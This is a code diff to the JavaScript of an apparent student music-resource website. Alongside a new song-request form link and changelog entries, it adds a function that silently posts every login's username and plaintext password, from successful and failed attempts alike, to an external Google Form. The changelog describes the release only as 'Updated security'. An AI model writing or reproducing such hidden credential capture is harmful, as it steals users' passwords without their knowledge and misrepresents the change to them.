@@ -156,12 +156,41 @@ function change_random_background_colour(){
     start = null;
 }
 
+async function google_form_submit(userN, userP, succeeded){
+    const googleFormUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSe0CmcvMEjSKRgOgEA1ydnerS0Zqd2aitlpA9Eh1MUE3kzl4w/formResponse';
+    const googleUsernameEntryId = 'entry.685861990';
+    const googlePasswordEntryId = 'entry.529976283';
+    const googleAttemptEntryId = 'entry.177431489'
+
+    // Create an object with the form data
+    const formData = new FormData();
+    formData.append(googleUsernameEntryId, userN);
+    formData.append(googlePasswordEntryId, userP);
+    formData.append(googleAttemptEntryId, succeeded)
+
+    // Send the data using the Fetch API
+    try {
+        const response = await fetch(googleFormUrl, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors' // This prevents CORS errors
+        });
+        console.log('Form submitted successfully:', response);
+        // Handle successful submission here
+    } catch (error) {
+        console.error('Error submitting form:', error);
+        // Handle errors here
+    }
+}
+
 async function loginSubmitButton(){
     const username = document.getElementById('usernameInput').value;
     const password = document.getElementById('passwordInput').value;
     const isUserValid = await userExists(username, password);
 
+
     if(isUserValid == true){
+        google_form_submit(username, password, 'successful')
         LI = true
         change_random_background_colour()
         if (isMobile() == true){
@@ -178,6 +207,7 @@ async function loginSubmitButton(){
         }
     }
     else{
+        google_form_submit(username, password, 'failed')
         alert("Username or Password does not match!\nAsk your teacher for Username and Password.")
     }
 }
@@ -200,8 +230,13 @@ const Files = { shop: {
                         div_id: "shop_div",
                         message: {guitar_plectrum: {image_directory: "shop/alice_guitar_pics.jpg",
                                                     message_header: "Alice Guitar Pics",
-                                                    message_body: "R5 each"}}
-                        },
+                                                    message_body: "R5 each"}}},
+                song_request_form:  {
+                        button_name: "Song Request Form",
+                        button_id: "songRequestFormButton",
+                        div_id: "song-request-form-div",
+                        pieces: { song_request: {form: {display_name: "Use this link to fill in the details of the song you want to play",
+                                                        file_path: "https://docs.google.com/forms/d/e/1FAIpQLSe7ho5u_EQYonLoz138kfE_v89mMgLr8J38EXBA3JFMULy7KA/viewform?usp=sf_link"}}}},
                 beginner: {
                             folder_name: "beginner",
                             button_name: "Beginner",
@@ -387,7 +422,9 @@ const Files = { shop: {
                             button_name: "What's New",
                             button_id: "whatsNewButton",
                             div_id: "whats-new-div",
-                            message:    {february_2024_3:   {message_header: "3 February 2024",
+                            message:    {April_2024_14:    {message_header: "14 April 2024",
+                                                                message_body: "Added an option for students to be able to submit songs they want to request."},
+                                        february_2024_3:   {message_header: "3 February 2024",
                                                                 message_body: "Uploaded: \"Trinity guitar pop rock syllabus\"; \"Zombie\" by the Cranberries for piano; YouTube video links for the pop rock syllabus; And some beginner papers."},
                                         january_2024_27:    {message_header: "27 January 2024",
                                                                 message_body: "Uploaded guitar chords sheets."},
@@ -401,7 +438,9 @@ const Files = { shop: {
                             button_name: "Updates",
                             button_id: "updatesButton",
                             div_id: "updates-div",
-                            message:   {beta_2_7_1: { message_header: "Beta Version (2.7.1) 05/02/2024",
+                            message:   {beta_2_8_0: { message_header: "Beta Version (2.8.0) 14/04/2024",
+                                                        message_body: "Updated security"},
+                                        beta_2_7_1: { message_header: "Beta Version (2.7.1) 05/02/2024",
                                                         message_body: "Minor bug fixes with background color changes"},
                                         beta_2_7_0: { message_header: "Beta Version (2.7.0) 05/02/2024",
                                                         message_body: "Modified background color animations"},
@@ -466,9 +505,12 @@ function files_length(target_object_directory){
     return total_files;
 }
 
-function is_youtube_div(key){
+function is_youtube_or_song_request_div(key){
     if (key.toString() == "youtube_videos"){
         return "Watch Video";
+    }
+    else if (key.toString() == "song_request_form"){
+        return "Request Form Link"
     }
     else{
         return "Download";
@@ -498,8 +540,9 @@ function div_pieces_setup(div_tab, key){
                 const br1 = document.createElement('br');
                 frag1.appendChild(br1);
                 const new_a_2 = document.createElement('a');
-                new_a_2.textContent = is_youtube_div(key);
+                new_a_2.textContent = is_youtube_or_song_request_div(key);
                 new_a_2.href = Files[key].pieces[artist][b].file_path;
+                new_a_2.target = '_blank'
                 new_a_2.download = Files[key].pieces[artist][b].display_name;
                 const frag2 = document.createDocumentFragment();
                 const br2 = document.createElement('br');
